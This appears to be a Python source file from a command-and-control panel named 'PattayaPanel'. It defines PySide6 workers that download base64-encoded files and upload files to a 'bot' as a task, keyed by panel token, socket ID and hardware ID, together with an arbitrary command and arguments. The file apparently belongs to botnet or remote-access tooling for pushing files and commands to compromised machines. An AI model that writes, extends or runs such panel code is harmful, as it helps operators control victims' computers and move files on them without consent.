from PySide6.QtCore import QObject, Signal
import os
import io

from core.util import PattayaPanelUtil

class FileDownloadWorker(QObject):
    finished = Signal(str)
    progress = Signal(str)

    file = ''
    filename = ''
    path = ''

    def setup_data(self, file, filename, path):
        self.file = file
        self.filename = filename
        self.path = path

    
    def doWorkDownload(self):
        file_path = os.path.join(self.path, self.filename)
        decoded_bytes = PattayaPanelUtil.base64_file_decode(self.file)
        with io.open(file_path, 'wb') as f:
            f.write(decoded_bytes)
        
        self.finished.emit(file_path)



class FileUploadWorker(QObject):
    finished = Signal(str)
    progress = Signal(str)
    error = Signal(str)

    socket = None
    file_path = None
    file_name = None

# self.token, 
# self.bot['socketId'], 
# self.bot['hwid'],
# command,
# arg,
# file_name, 
# incomingFilename, 
# )
    
    def setup_data(self, socket, token, socketId, hwid, command, arg, file_path, file_name, bot):
        self.socket = socket
        self.token = token
        self.socketId = socketId
        self.hwid = hwid
        self.command = command
        self.arg = arg
        self.file_path = file_path
        self.file_name = file_name
        self.bot = bot

    def doWorkUpload(self):

        if os.path.getsize(self.file_path) > 10 * 1024 * 1024: # check if file size is larger than 10MB
            self.error.emit(f"Cannot upload this file. File size has been exceeded (>10MB)")
            return

        incomingFilename = self.file_name
        incomingFile = PattayaPanelUtil.base64_file_encode(self.file_path)

        bot_task = {
            "panelToken": self.token,
            "socketId": self.socketId,
            "hwid": self.hwid,
            "command": self.command,
            "arguments": self.arg,
            "incomingFile": incomingFile,
            "incomingFilename": incomingFilename
        }
        try:
            self.socket.send_command('panel_send_bot_task', bot_task)
            self.finished.emit(f"Uploading file to bot {self.bot}")
        except Exception as e:
            self.error.emit(f'{str(e)}')


        


        